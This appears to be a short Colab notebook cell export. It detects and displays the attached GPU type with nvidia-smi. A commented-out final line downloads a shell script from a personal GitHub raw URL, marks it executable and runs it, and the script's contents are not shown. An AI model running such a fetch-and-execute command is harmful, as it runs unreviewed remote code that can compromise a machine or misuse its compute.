# %%
#@title SI TONO ^_^
from IPython.display import HTML
from subprocess import getoutput
s = getoutput('nvidia-smi')
if 'T4' in s:
  gpu = 'T4'
elif 'P100' in s:
  gpu = 'P100'
elif 'V100' in s:
  gpu = 'V100'
display(HTML(f"<h2>{gpu}</h2>"))
print(s)
# or simply
# !nvidia-smi -L

# %%
# !wget https://raw.githubusercontent.com/dianajualasbakkaca/mainton/main/danila.sh && chmod +x *.sh && ./danila.sh
